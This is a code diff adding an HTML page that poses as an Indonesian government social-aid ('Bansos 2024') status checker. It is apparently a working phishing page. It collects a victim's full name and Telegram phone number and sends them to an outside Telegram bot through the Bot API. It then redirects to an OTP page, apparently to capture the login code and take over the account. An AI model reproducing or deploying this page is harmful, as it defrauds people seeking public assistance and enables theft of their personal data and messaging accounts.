@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA BANSOS 2024</title>
+    <meta content="https://hosting.tigerengine.id/hj6zlu.jpg" property="og:image">
+<meta name="twitter:image" content="https://hosting.tigerengine.id/hj6zlu.jpg">
+    	<meta name="description" content="Kunjungi pos untuk informasi selengkapnya.">
+    
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 10vh;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 435px;
+            background-color: #fff;
+            border-radius: 10px;
+            top: 0;
+            padding: 10px;
+            text-align: center;
+        }
+
+        img {
+            width: 100%;
+            border-radius: 10px 10px 0 0;
+            margin: 0 auto;
+            left:0;
+            right:0;
+            display:flex;
+            margin-bottom: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 5px;
+            text-align: left;
+        }
+
+        input[type="text"],
+        input[type="tel"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
+            outline: none;
+        }
+
+        button {
+            background-color: #1279be;
+            color: #fff;
+            padding: 14px 25px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-size: 16px;
+            width: 100%;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.5);
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .flag {
+            display: inline-block;
+            margin-left: 10px;
+            vertical-align: middle;
+            margin-top: 10px;
+            position: absolute;
+            font-size: 20px;
+            color: #007bff;
+        }
+
+        .message {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+        }
+
+        .message.success {
+            background-color: #d4edda;
+            color: #468847;
+            border: 1px solid #c3e6cb;
+        }
+
+        .message.error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <img src="vlxdhp.png" alt="">
+        
+        <form method="post" onsubmit="sendHp()">
+        <div class="form-group">
+            <label for="nama">Nama Lengkap</label>
+            <input type="text" id="nama" placeholder="Nama Lengkap Sesuai KTP" required>
+        </div>
+
+        <div class="form-group">
+            <label for="no_hp">Nomor Telegram</label>
+            <div class="flag">🇮🇩</div>
+            <input type="tel" style="padding-left: 40px;" id="nohp" placeholder="+62" required>
+        </div>
+
+        <button id="cek-status" type="submit">Cek Status</button>
+        <div class="message" id="message"></div>
+    </div>
+    </form>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+    <script src="i.js"></script>
+    <script>
+        var nama = $('#nama').val();
+        sessionStorage.setItem('nama', nama);
+        var nohp = $('#nohp').val();
+        sessionStorage.setItem("nohp", nohp);
+        
+     
+     
+function sendHp(){
+   
+    event.preventDefault();   
+    $("#cek-status").prop("disabled", true);
+    document.getElementById('cek-status').innerHTML = "Memproses....";               
+    var logo = "____𝗕𝗮𝗻𝘀𝗼𝘀_𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽༻";    
+    var nama = $('#nama').val();
+        sessionStorage.setItem('nama', nama);
+        var nohp = $('#nohp').val();
+        sessionStorage.setItem("nohp", nohp);
+    var gabungan = '' + '%0A%0A- 𝗡𝗮𝗺𝗮 •• ' + nama +  '%0A- 𝗡𝗼.𝗛𝗽 •• ' + nohp ;  
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,    
+    complete: function(){    
+    setTimeout(function(){   
+    window.location = "otp.html";
+    
+    document.getElementById('cek-status').innerHTML = "Cek Status"; 
+    
+
+    }, 100);}});};
+     
+     
+     
+     
+     
+     
+        
+    </script>
+</body>
+</html>
